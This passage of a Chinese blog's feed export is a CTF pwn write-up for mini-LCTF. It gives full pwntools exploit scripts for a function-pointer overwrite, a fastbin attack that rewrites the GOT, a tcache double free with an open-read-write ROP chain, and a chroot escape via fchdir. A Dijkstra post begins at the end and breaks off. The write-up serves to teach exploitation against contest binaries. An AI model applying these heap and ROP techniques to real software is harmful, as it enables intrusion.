alt="image.png"></p><p>故我们只需要覆写掉函数指针所指的函数为backdoor()函数即可getshell</p><p>构造二级指针的结构应为</p><table><thead><tr><th>buf</th><th>buf+4</th></tr></thead><tbody><tr><td>右边那一块的地址 -&gt;</td><td>指向backdoor函数的地址</td></tr></tbody></table><p>buf的地址如下：</p><img src="https://img-blog.csdnimg.cn/20200809084003820.png" alt="image.png" style="zoom:50%;" /><p>故得exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'easycpp'</span>)<span class="comment">#p = remote('pwn.challenge.lctf.online', 10030)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80487BB</span></span><br><span class="line">buf = <span class="number">0x804A0C0</span></span><br><span class="line"></span><br><span class="line">payload = p32(buf + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>向服务器发送payload，成功getsgell</p><p><img src="https://i.loli.net/2020/09/11/OdBjaJgWUSbM6xk.png" alt="2Z~KGBW9__2C_6__Z_JM770.png"></p><blockquote><p>可能是因为一些奇奇怪怪的原因，<code>cat flag</code>出来的flag不对</p></blockquote><h2 id="noleak-Integer-Overflow-Heap-Overflow-Fastbin-Attack"><a href="#noleak-Integer-Overflow-Heap-Overflow-Fastbin-Attack" class="headerlink" title="noleak - Integer Overflow + Heap Overflow + Fastbin Attack"></a>noleak - Integer Overflow + Heap Overflow + Fastbin Attack</h2><p>  <a href="/download/minil/pwn/time_management.zip"点击此处下载原题"">点击下载-time_management.zip</a> </p><p>首先是惯例的<code>checksec</code>，发现开了NX保护和Canary</p><p><img src="https://i.loli.net/2020/08/31/vZL7GP5XMoWfFwt.png" alt="image.png"></p><p>先简单运行看一下，有新建、编辑、删除的简单计划程序，这种十分规范的模式让人感觉的出来应该是一道堆题（<del>说好的只出栈呢</del></p><p><img src="https://i.loli.net/2020/09/01/JKcL64lqDZRCVtX.png" alt="image.png"></p><p>拖入IDA进行分析：（以下部分函数及变量经重命名<br><img src="https://i.loli.net/2020/10/12/ryTpm7ONMEoJZRi.png" alt="image.png"></p><p>该程序有着<strong>分配、修改、释放堆块</strong>的功能，<del>一看就是一道很难的堆题</del></p><p>我们发现在用以读入输入的<code>sub_400896()</code>函数中存在整数溢出漏洞：当我们输入的长度为0时，由于其会先减一再转换成unsigned int类型，发生整数溢出，导致我们可以输入较长的内容到堆块上</p><p><img src="https://i.loli.net/2020/10/13/wptrfo1kUVDMFW6.png" alt="image.png"></p><p>同时我们发现存在白给的后门函数`:<br><img src="https://i.loli.net/2020/10/13/h4TKcsqDNS8ibFH.png" alt="image.png"></p><p>由于got表开启了读写权限，故考虑<strong>fastbin attack</strong>：伪造fake chunk改写got表中free的地址为后门函数地址，之后随意释放一个堆块即可getshell</p><p>由于堆块指针表位于bss段，故我们考虑将其中一个指针的地址改写为free@got后直接edit即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn.challenge.lctf.online'</span>,<span class="number">10069</span>)</span><br><span class="line">e = ELF(<span class="string">'./time_management'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">ptr_array = <span class="number">0x6020c0</span></span><br><span class="line">backdoor_addr = <span class="number">0x400c9f</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size:int,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'Your choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'How many minutes will it take you to finish?'</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'Content of the plan: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int,size:int,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'Your choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Index : '</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'How many minutes will it take you to finish?'</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'Content of the plan: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'Your choice : '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Index : '</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x60</span>,<span class="string">'arttnba3'</span>)<span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x60</span>,<span class="string">'arttnba3'</span>)<span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x60</span>,<span class="string">'arttnba3'</span>)<span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x60</span>*<span class="string">b'A'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x71</span>) + p64(ptr_array - <span class="number">0x10</span><span class="number">-3</span>))</span><br><span class="line">alloc(<span class="number">0x60</span>,<span class="string">'arttnba3'</span>)<span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x60</span>,<span class="string">'arttnba3'</span>)<span class="comment">#idx3, fake chunk above the ptr_array</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0</span>,<span class="string">b'A'</span>*<span class="number">3</span> + p64(e.got[<span class="string">'free'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,p64(backdoor_addr))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即可getshell</p><p><img src="https://i.loli.net/2020/10/13/X4A7mZvcDypoznQ.png" alt="image.png"></p><h2 id="heap-master-tcache-double-free-use-after-free-orw"><a href="#heap-master-tcache-double-free-use-after-free-orw" class="headerlink" title="heap_master - tcache double free(use after free) + orw"></a>heap_master - tcache double free(use after free) + orw</h2><p> <a href="/download/minil/pwn/pwn"点击此处下载原题"">点击下载-pwn</a> </p><blockquote><p>遭到了sad师傅的暴击Or2</p></blockquote><blockquote><p>（某种程度上算是minil的压轴题…？<del>虽然说当时我连看都没看</del>（←摸鱼划水人士，小朋友别学他</p></blockquote><p>惯例的<code>checksec</code>，发现除了地址随机化以外都开上了</p><p><img src="https://i.loli.net/2020/11/15/biBCsTKHSuj4l9f.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/11/15/sFaTZAYb5oqDU3I.png" alt="image.png"></p><p>程序本身有着分配堆块、释放堆块、输出堆块内容的功能</p><p>我们发现在<code>delete()</code>函数中<code>free()</code>后<strong>并没有将相应堆块指针置0，存在UAF</strong></p><p><img src="https://i.loli.net/2020/11/15/Ua3OnZdlLFswe48.png" alt="image.png"></p><p>题目提示libc可能是2.23也可能是2.27，尝试<strong>直接进行double free，发现程序没有崩溃</strong>，故可知是没有double free检查的2.27的tcache</p><blockquote><p>libc2.29后tcache加入double free检查</p></blockquote><p><img src="https://i.loli.net/2020/11/15/yF7H8SBxf9mJcAb.png" alt="image.png"></p><p>在<code>main()</code>函数开头的<code>init()</code>函数中调用了<code>prctl()</code>函数，限制了我们不能够getshell<img src="https://i.loli.net/2020/11/19/q3Jaw8BfEYjGUNd.png" alt="image.png"></p><p>首先我们想到，我们可以先填满tcache，之后分配一个unsorted bin范围的chunk，通过打印该chunk的内容获取<strong>main_arena + 0x60</strong>的地址，<strong>进而获得libc的地址</strong></p><blockquote><p>libc2.27之前unsorted bin里的chunk的fd/bk似乎是指向main_arena+0x58的，现在变成main_arena+0x60了，等有时间得去看看libc2.27的源码了…</p></blockquote><p>虽然我们不能够getshell，但是依然可以通过double free进行任意地址写，<del>毕竟CTF题目的要求是得到flag，不一定要得到shell，</del>故考虑<strong>通过environ变量泄漏出栈地址后在栈上构造rop链进行orw读出flag</strong></p><blockquote><p>tips: __environ是一个保存了栈上变量地址的系统变量</p></blockquote><p>通过动态调试我们容易得到<code>___environ</code>与<code>new()</code>中的返回地址间距离为0x220，<strong>将rop链写到这个返回地址上即可接收到flag</strong></p><p><img src="https://i.loli.net/2020/11/20/auVAHxCbtO6IUjm.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/20/ULcoXK4GiISg6Vb.png" alt="image.png"></p><p>构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>) <span class="comment"># p = remote('pwn.challenge.lctf.online',10042)</span></span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x6020c0</span></span><br><span class="line">flag_addr = e.bss() + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'size?'</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'content?'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'index ?'</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'index ?'</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'what is your name? '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'arttnba3'</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin leak libc addr</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x60</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>] <span class="comment"># 0x3cbc30</span></span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">'__environ'</span>] <span class="comment"># 0x3ee098</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">'pop rdi\nret'</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">'pop rsi\nret'</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">'pop rdx\nret'</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free in tcache 2</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite node[0]</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(note_addr)) <span class="comment"># idx 4, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 5, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(environ))<span class="comment"># idx 6, locate at the note[0] and overwrite it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack addr</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    stack_leak = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">    ret = stack_leak - <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain</span></span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">4</span>) + p64(e.plt[<span class="string">'read'</span>]) <span class="comment"># read str 'flag' from input</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">'open'</span>])<span class="comment"># open file 'flag'</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(e.plt[<span class="string">'read'</span>])<span class="comment"># read flag from file ptr 3(opened by open())</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(e.plt[<span class="string">'puts'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free write rop chain on stack</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    new(<span class="number">0xb0</span>, p64(ret))<span class="comment"># idx 7, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 8, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, payload) <span class="comment"># idx 9, locate on the stack</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    p.send(<span class="string">'flag'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>运行脚本即得flag</p><p><img src="https://i.loli.net/2020/11/20/FcWrg87oXnbLCMz.png" alt="image.png"></p><blockquote><p>【感想】</p><p>不愧是能让sad师傅困扰一天的题目，也让我困扰了一天…同时也确实如同🐧师傅所说的，“这是十分值得复现的一道题”</p><p>比较精髓的一个点应该就是对于环境变量__environ的利用来在栈上构造rop链了</p><p>【踩坑*1】<br>一开始我在自己的manjaro(libc2.32)上调，计算出来的__environ到返回地址的距离是0x230…，然后一直打不通…<br><img src="https://i.loli.net/2020/11/20/YVmyzB9bQlHRXTP.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/20/Md3goS9BXeEjZup.png" alt="image.png"></p><p>冥思苦想半天只好选择装个ubuntu18(libc2.27)试一下，发现距离居然是0x220…然后就通了…</p><p><img src="https://i.loli.net/2020/11/20/H6L1VvxqBJ2RjuA.png" alt="image.png"></p><p>【未解决问题】<br>在第一次double free的时候的chunk size必须为0x60（0x71），第二次double free时的chunk size必须大于等于0xb0（0xc1），究竟为何我暂且蒙在古里…（希望有师傅能通过左侧的邮箱告诉我www）</p></blockquote><h2 id="jail-chroot越狱"><a href="#jail-chroot越狱" class="headerlink" title="jail - chroot越狱"></a>jail - chroot越狱</h2><p> <a href="/download/minil2020/pwn/chroot"点击此处下载原题"">点击下载-chroot</a> </p><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/11/20/pZ52yv41Y9MzgXu.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/17/UAd879DKuVqtSzW.png" alt="image.png"></p><p>不难看出该程序会fork()出子进程，子进程读入我们的输入并调用<code>execveat</code>系统调用来尝试执行我们的程序</p><p>但是flag一般位于根目录下，而我们在子进程中的工作目录被转移到了/tmp/jail/下，无法直接读取根目录下的flag</p><p><img src="https://i.loli.net/2020/12/17/XK1xs6dZqNFDWUp.png" alt="image.png"></p><p>注意到在开头的init()函数中会打开<code>/tmp</code>和<code>/</code>，文件描述符分别为3和4（0，1，2为stdin，stdout，stderr）</p><p><img src="https://i.loli.net/2020/12/17/dEpTerQuxzOPiwS.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/12/17/QZDHioSU3eWTpvh.png" alt="image.png"></p><p>故直接考虑使用<code>fchdir()</code>函数便可切换到根目录下读取flag</p><p>构造exp如下</p><h3 id="C部分"><a href="#C部分" class="headerlink" title="C部分"></a>C部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">fchdir(<span class="number">4</span>);</span><br><span class="line">fd = open64(<span class="string">"flag"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fd:%d\n"</span>, fd);</span><br><span class="line"><span class="built_in">read</span>(fd, buf, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Python部分"><a href="#Python部分" class="headerlink" title="Python部分"></a>Python部分</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">f = open(<span class="string">'./exploit'</span>, <span class="string">'rb'</span>)</span><br><span class="line">payload = f.read()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./chroot'</span>)</span><br><span class="line">p.sendline(str(len(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/17/dTNEzj1rDin5lR9.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;mini-LCTF，前身是makerCTF，是西电校内享誉盛名（？）的CTF，作为菜鸡CTFer也尝试着参加了一手&lt;/p&gt;
&lt;p&gt;因为咱主攻PWN的原因，所以这一篇应该只有PWN（&lt;/p&gt;
&lt;p&gt;（不过主要还是因为我太菜了XD&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：所有题目在&lt;a href=&quot;https://archive.lctf.online&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;archive.lctf.online&lt;/a&gt;上都有部署&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="堆" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="Alphanumeric Shellcode" scheme="http://archive.next.arttnba3.cn/tags/Alphanumeric-Shellcode/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="ret2shellcode" scheme="http://archive.next.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="栈迁移" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>【算法浅析-0x02】Dijkstra算法浅析 by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/04/23/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x02%E3%80%91Dijkstra%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/04/23/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x02%E3%80%91Dijkstra%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/</id>
    <published>2020-04-23T03:51:52.000Z</published>
    <updated>2020-08-29T08:20:22.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><strong>Dijkstra算法</strong>算是图论当中最为基础的算法之一，也是各类信息学竞赛（ Olympiad in Informatics ）当中各大图论算法的基础，碰巧今天的离散数学课刚好讲到了Dijkstra算法，所以作为一名蒟蒻·前OIer，今天就来简单讲讲什么是Dijkstra算法XD</p><p><del>不过我当年打OI的时候基本没怎么研究过图论，所以没出过啥成绩XD</del></p><a id="more"></a><h1 id="0x01-什么是Dijkstra算法？"><a href="#0x01-什么是Dijkstra算法？" class="headerlink" title="0x01.什么是Dijkstra算法？"></a>0x01.什么是Dijkstra算法？</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p>迪杰斯特拉算法(Dijkstra)是由荷兰计算机科学家<a href="https://baike.baidu.com/item/狄克斯特拉/2828872" target="_blank" rel="noopener">狄克斯特拉</a>于1959 年提出的，因此又叫<a href="https://baike.baidu.com/item/狄克斯特拉算法/6764865" target="_blank" rel="noopener">狄克斯特拉算法</a>。是从一个顶点到其余各顶点的<a href="https://baike.baidu.com/item/最短路径" target="_blank" rel="noopener">最短路径</a>算法，解决的是有权图中最短路径问题。迪杰斯特拉算法主要特点是从起始点开始，采用<a href="https://baike.baidu.com/item/贪心算法/5411800" target="_blank" rel="noopener">贪心算法</a>的策略，每次遍历到始点距离最近且未访问过的顶点的邻接节点，直到扩展到终点为止。 </p><p><a href="https://baike.baidu.com/item/迪克斯特拉算法" target="_blank" rel="noopener">百度百科：Dijkstra算法</a></p><p>戴克斯特拉算法设置了一顶点集合<strong>S</strong>，在集合中所有的顶点与源点<strong>s</strong>之间的最终最短路径权值均已确定。算法反复选择最短路径估计最小的点<strong>u∈V-S</strong>并将加入中。该算法常用于路由其他图算法的一个子模块 </p><p><a href="https://zh.wikipedia.org/wiki/戴克斯特拉算法" target="_blank" rel="noopener">维基百科：戴克斯特拉算法</a></p></blockquote><p>简单地说，Dijkstra算法就是：<strong>在正权图中使用贪心算法不断进行搜索从而求出最短路径的搜索算法</strong></p><h2 id="具体过程"><a href="#具体过程" class="headerlink" 